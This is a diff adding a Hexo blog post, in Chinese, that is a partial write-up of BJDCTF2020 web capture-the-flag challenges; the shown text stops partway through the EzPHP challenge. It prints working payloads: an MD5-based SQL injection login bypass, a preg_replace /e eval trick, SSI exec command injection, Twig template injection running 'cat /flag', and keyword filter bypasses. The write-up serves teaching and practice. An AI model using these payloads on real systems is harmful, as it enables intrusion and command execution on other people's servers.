@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.2">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.2">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.2">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.2" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.2">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.2',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="前言：最近真的太颓废了，天天啥也不想干，这个比赛之前有人问过我一些题目，挺简单的，这里简单记录一下。web1.Easy MD5查看响应包，看到这条查询语句，可存在注入。输入ffifdyop即可登录，ffifdyop对应md5转字符串会有’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c，然后有两个md5判断，数组绕过即可。">
+<meta name="keywords" content="CTF,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BJDCTF2020部分wp">
+<meta property="og:url" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2020&#x2F;02&#x2F;08&#x2F;BJDCTF2020%E9%83%A8%E5%88%86wp&#x2F;index.html">
+<meta property="og:site_name" content="LiM&#39;s blog">
+<meta property="og:description" content="前言：最近真的太颓废了，天天啥也不想干，这个比赛之前有人问过我一些题目，挺简单的，这里简单记录一下。web1.Easy MD5查看响应包，看到这条查询语句，可存在注入。输入ffifdyop即可登录，ffifdyop对应md5转字符串会有’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c，然后有两个md5判断，数组绕过即可。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2020&#x2F;02&#x2F;08&#x2F;BJDCTF2020%E9%83%A8%E5%88%86wp&#x2F;1581224754272.png">
+<meta property="og:updated_time" content="2020-02-17T06:21:17.414Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2020&#x2F;02&#x2F;08&#x2F;BJDCTF2020%E9%83%A8%E5%88%86wp&#x2F;1581224754272.png">
+  <link rel="canonical" href="https://li1m.github.io/2020/02/08/BJDCTF2020%E9%83%A8%E5%88%86wp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>BJDCTF2020部分wp | LiM's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">LiM's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+        
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-friends">
+      
+    
+
+    <a href="/friends/" rel="section"><i class="fa fa-fw fa-paw"></i>friends</a>
+
+  </li>
+      
+    
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger">
+          <i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Searching..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://Li1M.github.io/2020/02/08/BJDCTF2020%E9%83%A8%E5%88%86wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="LiM">
+      <meta itemprop="description" content="念念不忘，必有回响">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LiM's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            BJDCTF2020部分wp
+            
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              
+                
+              
+
+              <time title="Created: 2020-02-08 21:06:16" itemprop="dateCreated datePublished" datetime="2020-02-08T21:06:16+08:00">2020-02-08</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-02-17 14:21:17" itemprop="dateModified" datetime="2020-02-17T14:21:17+08:00">2020-02-17</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              
+              <span>18k</span>
+            </span>
+          
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              
+              <span>16 mins.</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>前言：最近真的太颓废了，天天啥也不想干，这个比赛之前有人问过我一些题目，挺简单的，这里简单记录一下。</p><p>web<br>1.Easy MD5<br>查看响应包，看到这条查询语句，可存在注入。输入ffifdyop即可登录，ffifdyop对应md5转字符串会有’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c，然后有两个md5判断，数组绕过即可。</p><a id="more"></a>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">'admin'</span> <span class="keyword">where</span> <span class="keyword">password</span>=<span class="keyword">md5</span>($pass,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure>
+
+<p>2.Mark loves cat<br>考git泄露，变量覆盖，用githack得到源码，按要求GET传参yds=flag即可，也有其他方法如flag=flag&amp;is=flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure>
+
+<p>3.The mystery of ip<br>这是一个模板注入，ip那里可以通过xff头控制，直接命令执行得到flag<br><img src="1581224754272.png" alt="1581224754272"></p>
+<p>4.ZJCTF，不过如此<br>代码审计，读next源码，next源码如下，是preg_replace的/e命令执行问题，网上可以找到解析，这里记录一下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ebc8bd91-aa37-4862-af8e-328e56311980.node3.buuoj.cn/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br><span class="line">// POST传参I have a dream</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ebc8bd91-aa37-4862-af8e-328e56311980.node3.buuoj.cn/next.php?\S*=$&#123;eval($_POST[a])&#125;	//POST传参a执行命令</span><br></pre></td></tr></table></figure>
+
+<p>5.EasySearch<br>打开页面，加.swp出现源码，POST输入username的值会写入一个shtml文件，这里可以shtml命令执行。写入的文件在响应头里有。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ob_start();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span>;</span><br><span class="line">		$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">		$content = uniqid().$random;</span><br><span class="line">		<span class="keyword">return</span> sha1($content); </span><br><span class="line">	&#125;</span><br><span class="line">    header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> $_POST[<span class="string">'username'</span>] != <span class="string">''</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = <span class="string">'6d0bc1'</span>;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">'password'</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;"</span>;</span><br><span class="line">            $file_shtml = <span class="string">"public/"</span>.get_hash().<span class="string">".shtml"</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">            $text = <span class="string">'</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,'</span>.$_POST[<span class="string">'username'</span>].<span class="string">'&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***'</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"[!] Header  error ..."</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;"</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://34be7d1f-9284-4210-950b-b6e9a48e8624.node3.buuoj.cn/index.php</span><br><span class="line">//POST传参username=&lt;!--#exec cmd=&quot;ls /var/www/html&quot; --&gt;&amp;password=2020666	在网站根目录找到flag</span><br></pre></td></tr></table></figure>
+
+<p>6.Cookie is so stable<br>也是ssti，是Twig的模板，试一下2就会回显2。请求包文如下。</p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"></span><span class="template-variable">&#123;&#123;\_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;</span><span class="xml"></span><span class="template-variable">&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</span><span class="xml">	//获取flag</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ffad6ae9<span class="number">-9113</span><span class="number">-4</span>fba-b290-b48ed5a3bc34.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">72.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">72.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Referer: http://ffad6ae9-9113-4fba-b290-b48ed5a3bc34.node3.buuoj.cn/flag.php</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Cookie: __cfduid=df52311039f2f717d63d154645ddf93431564799805; _ga=GA1.2.734922133.1576570185; PHPSESSID=62edce95a63b7e8a56e7dba66c50974d; user=&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br></pre></td></tr></table></figure>
+
+<p>7.EzPHP<br>查看源码，有一段base32，解码后是真正题目地址，套娃题，一步一步绕过，代码如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">"1nD3x.php"</span>;</span><br><span class="line">$shana = $_GET[<span class="string">'shana'</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line">$arg = <span class="string">''</span>;</span><br><span class="line">$code = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/http|https/i'</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>); </span><br><span class="line">&#125;	<span class="comment">//这一段的意思是请求查询语句中不能含有正则中的字符，但是$_SERVER['QUERY_STRING']不会经过url编码，而GET请求会经过url编码，所以这段可以url编码绕过。</span></span><br></pre></td></tr></table></figure>
+
